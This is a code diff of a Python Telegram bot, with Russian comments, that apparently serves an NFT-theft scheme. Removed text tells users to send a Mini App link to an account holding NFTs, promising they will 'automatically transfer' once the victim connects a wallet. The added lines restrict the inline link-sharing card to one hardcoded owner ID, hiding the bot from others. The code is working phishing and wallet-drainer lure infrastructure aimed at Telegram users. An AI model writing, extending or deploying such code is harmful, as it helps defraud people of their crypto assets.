@@ -29,49 +29,23 @@ WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://project-nft.onrender.com")
 BOT_USERNAME = os.getenv("BOT_USERNAME", "IncognitoGiftsBot")
 APP_SHORT_NAME = os.getenv("APP_SHORT_NAME", "incognitogifts")
 
+# ID владельца бота (только он может использовать inline режим)
+OWNER_USER_ID = 8494675902
+
 if not BOT_TOKEN:
     raise ValueError("TELEGRAM_BOT_TOKEN не установлен в .env")
 
 telegram_app = Application.builder().token(BOT_TOKEN).build()
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-
-    logger.info(f"Пользователь {user_id} ({user.username}) запустил бота")
-
-    # Официальная ссылка на Mini App с красивым preview
-    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
-
-    message_text = (
-        f"🎁 **Получить Telegram NFT**\n\n"
-        f"Отправь эту ссылку на аккаунт с NFT:\n"
-        f"{mini_app_link}\n\n"
-        f"💎 Все NFT автоматически перейдут на твой аккаунт **{user.first_name}**\n\n"
-        f"_При открытии ссылки - подключи кошелёк и NFT моментально переведутся!_"
-    )
-
-    # Кнопка с прямой ссылкой на Mini App
-    keyboard = [
-        [InlineKeyboardButton("🎁 Открыть приложение", url=mini_app_link)]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    await update.message.reply_text(
-        message_text,
-        reply_markup=reply_markup,
-        parse_mode='Markdown'
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🦦 Напиши `@IncognitoGiftsBot` в любом чате чтобы отправить NFT!",
-        parse_mode='Markdown'
-    )
-
 async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обрабатывает inline запросы - показывает красивую карточку с видео (высокое качество)"""
     user_id = update.inline_query.from_user.id
+
+    # Проверка доступа: только владелец может использовать бота
+    if user_id != OWNER_USER_ID:
+        logger.warning(f"Попытка доступа от неавторизованного пользователя: {user_id}")
+        await update.inline_query.answer([], cache_time=1)
+        return
 
     # Ссылка на Mini App
     mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
@@ -103,8 +77,6 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.inline_query.answer(results, cache_time=1)
 
-telegram_app.add_handler(CommandHandler("start", start))
-telegram_app.add_handler(CommandHandler("help", help_command))
 telegram_app.add_handler(InlineQueryHandler(inline_query))
 
 user_addresses = {}
